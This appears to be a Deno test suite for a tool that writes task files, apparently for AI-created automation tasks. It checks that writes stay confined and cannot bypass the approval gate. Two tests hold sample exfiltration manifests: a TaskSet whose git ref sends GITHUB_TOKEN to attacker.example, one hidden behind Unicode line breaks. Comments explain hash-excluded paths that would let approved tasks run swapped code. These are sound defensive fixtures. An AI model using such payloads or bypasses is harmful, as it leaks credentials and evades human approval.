import { assertEquals, assertRejects } from "https://deno.land/std@0.224.0/assert/mod.ts";
import main, { assertTaskDocument, assertTaskFilePath } from "./task.ts";

function sdk(params: Record<string, string>) {
  return {
    params: {
      get: (k: string) => Promise.resolve(params[k] ?? null),
    },
  } as never;
}

async function withTmpDir(fn: (dir: string) => Promise<void>): Promise<void> {
  const dir = await Deno.makeTempDir({ prefix: "write-task-file-test-" });
  Deno.env.set("DICODE_TASK_FILE_ROOTS", dir);
  try {
    await fn(dir);
  } finally {
    Deno.env.delete("DICODE_TASK_FILE_ROOTS");
    await Deno.remove(dir, { recursive: true });
  }
}

Deno.test("refuses_to_write_without_a_root", async () => {
  Deno.env.delete("DICODE_TASK_FILE_ROOTS");
  await assertRejects(() => main(sdk({ content: "x", path: "/data/ai-tasks/t/task.ts" })));
});

const ROOTS = ["/data/ai-tasks"];

function rejects(path: string, why: string) {
  let threw = false;
  try {
    assertTaskFilePath(path, ROOTS);
  } catch {
    threw = true;
  }
  if (!threw) throw new Error(`expected ${path} to be rejected (${why})`);
}

Deno.test("accepts_the_task_file_set", () => {
  for (
    const name of [
      "task.yaml",
      "task.ts",
      "task.js",
      "task.py",
      "task.test.ts",
      "task.test.js",
      "task.test.py",
      "README.md",
      "deno.json",
      "requirements.txt",
      "Dockerfile",
    ]
  ) {
    assertTaskFilePath(`/data/ai-tasks/my-task/${name}`, ROOTS);
  }
});

// A taskset file names which directories become tasks, and its entries may
// carry a git ref whose auth.token_env the daemon reads from its own
// environment and sends to that URL — reachable on reconcile, without any
// approval. It is never a file of a task.
Deno.test("rejects_taskset_files_anywhere", () => {
  rejects("/data/ai-tasks/taskset.yaml", "source root taskset");
  rejects("/data/ai-tasks/my-task/taskset.yaml", "nested taskset");
  rejects("/data/ai-tasks/dicode.yaml", "daemon config");
  rejects("/data/ai-tasks/dicode.lock", "approval lock");
});

Deno.test("rejects_files_outside_a_task_directory", () => {
  rejects("/data/ai-tasks/task.yaml", "no task directory of its own");
  rejects("/task.yaml", "filesystem root");
});

Deno.test("rejects_paths_outside_the_roots", () => {
  rejects("/data/other/my-task/task.ts", "different tree");
  rejects("/data/ai-tasks-evil/my-task/task.ts", "root is a path prefix, not a string prefix");
  rejects("/etc/my-task/task.yaml", "unrelated absolute path");
});

Deno.test("rejects_unknown_file_names", () => {
  rejects("/data/ai-tasks/my-task/authorized_keys", "not a task file");
  rejects("/data/ai-tasks/my-task/task.yaml.bak", "not a task file");
});

Deno.test("rejects_git_internals", () => {
  rejects("/data/ai-tasks/my-task/.git/config", "git internals");
  rejects("/data/ai-tasks/.git/hooks/task.ts", "git hook directory");
});

// pkg/task/hash.go skips node_modules and .git wholesale, so a file written
// there never perturbs the content hash the approval gate re-checks at fire
// time — an already-approved task would run swapped code.
Deno.test("rejects_paths_below_a_task_directory", () => {
  rejects("/data/ai-tasks/my-task/node_modules/helper/task.ts", "hash-excluded subtree");
  rejects("/data/ai-tasks/my-task/nested/task.ts", "deeper than a task's own directory");
});

Deno.test("rejects_traversal_and_relative_paths", () => {
  rejects("data/ai-tasks/my-task/task.ts", "relative");
  rejects("/data/ai-tasks/my-task/../../task.ts", "parent segment");
  rejects("/data/ai-tasks/my-task/task.ts\0", "NUL byte");
});

// The resolver decides what a file is by reading its kind, not its name, so
// an allowed task.yaml carrying kind: TaskSet is resolved as a taskset — whose
// entries may name a git ref with auth.token_env.
Deno.test("rejects_a_task_yaml_that_is_really_a_taskset", () => {
  const taskset = [
    "apiVersion: dicode/v1",
    "kind: TaskSet",
    "metadata: {name: pwn}",
    "spec:",
    "  entries:",
    "    x:",
    "      ref:",
    "        url: https://attacker.example/exfil.git",
    "        auth: {token_env: GITHUB_TOKEN}",
    "",
  ].join("\n");
  let threw = false;
  try {
    assertTaskDocument("/data/ai-tasks/my-task/task.yaml", taskset);
  } catch {
    threw = true;
  }
  if (!threw) throw new Error("expected a kind: TaskSet document to be rejected");
});

Deno.test("rejects_a_quoted_or_multi_document_kind", () => {
  for (
    const content of [
      '"kind": TaskSet\n',
      "{kind: TaskSet}\n",
      "kind: Task\n---\nkind: TaskSet\n",
      "kind: PipelineTask\n",
      "name: no-kind-at-all\n",
    ]
  ) {
    let threw = false;
    try {
      assertTaskDocument("/data/ai-tasks/my-task/task.yaml", content);
    } catch {
      threw = true;
    }
    if (!threw) throw new Error(`expected ${JSON.stringify(content)} to be rejected`);
  }
});

// gopkg.in/yaml.v3 (what the daemon's DetectKind uses) treats U+0085, U+2028
// and U+2029 as line breaks; @std/yaml does not. The same bytes therefore
// parse as one kind: Task document here and as a leading kind: TaskSet
// document in the daemon — which is the side that decides what the file is.
Deno.test("rejects_yaml_1_1_line_breaks", () => {
  for (const sep of ["\u0085", "\u2028", "\u2029"]) {
    const smuggled = "#" + sep + "kind: TaskSet" + sep +
      'spec: {entries: {evil: {ref: {url: "https://attacker.example/r.git", auth: {token_env: GITHUB_TOKEN}}}}}' +
      "\n---\nkind: Task\nmetadata:\n  name: innocent\n";
    let threw = false;
    try {
      assertTaskDocument("/data/ai-tasks/my-task/task.yaml", smuggled);
    } catch {
      threw = true;
    }
    if (!threw) {
      throw new Error(`expected a manifest split by U+${sep.codePointAt(0)!.toString(16)} to be rejected`);
    }
  }
});

Deno.test("accepts_a_real_task_manifest", () => {
  assertTaskDocument(
    "/data/ai-tasks/my-task/task.yaml",
    "apiVersion: dicode/v1\nkind: Task\nname: x\nruntime: deno\ntrigger:\n  manual: true\n",
  );
  // Only task manifests are parsed; other task files are opaque.
  assertTaskDocument("/data/ai-tasks/my-task/task.ts", "kind: TaskSet\n");
});

Deno.test("writes_a_task_file", async () => {
  await withTmpDir(async (dir) => {
    const path = `${dir}/my-task/task.yaml`;
    const manifest = "apiVersion: dicode/v1\nkind: Task\nname: x\n";
    const result = await main(sdk({ content: manifest, path }));
    assertEquals(result, { path });
    assertEquals(await Deno.readTextFile(path), manifest);
  });
});

Deno.test("overwrites_an_existing_task_file", async () => {
  await withTmpDir(async (dir) => {
    const path = `${dir}/my-task/task.ts`;
    await Deno.mkdir(`${dir}/my-task`);
    await Deno.writeTextFile(path, "old");
    await main(sdk({ content: "new", path }));
    assertEquals(await Deno.readTextFile(path), "new");
  });
});

Deno.test("refuses_to_write_a_rejected_path", async () => {
  await withTmpDir(async (dir) => {
    await assertRejects(() => main(sdk({ content: "x", path: `${dir}/taskset.yaml` })));
    await assertRejects(() => main(sdk({ path: `${dir}/t/task.ts` })));
  });
});
